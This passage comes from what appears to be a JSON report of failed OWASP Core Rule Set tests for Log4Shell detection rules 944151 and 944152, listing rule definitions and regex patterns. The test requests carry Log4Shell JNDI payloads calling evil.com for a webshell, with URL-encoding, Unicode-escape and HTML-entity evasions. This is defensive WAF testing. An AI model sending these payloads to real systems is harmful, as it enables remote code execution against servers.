        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 9,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Log4J exploit on JSON with URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 10,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, uppercase",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, uppercase",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u007Bjndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 11,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, lowercase",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, lowercase",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u007bjndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 12,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, lower case",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, lower case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$&lbrace;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 13,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, upper case",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, upper case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$&LBRACE;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 14,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"&#36;{jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
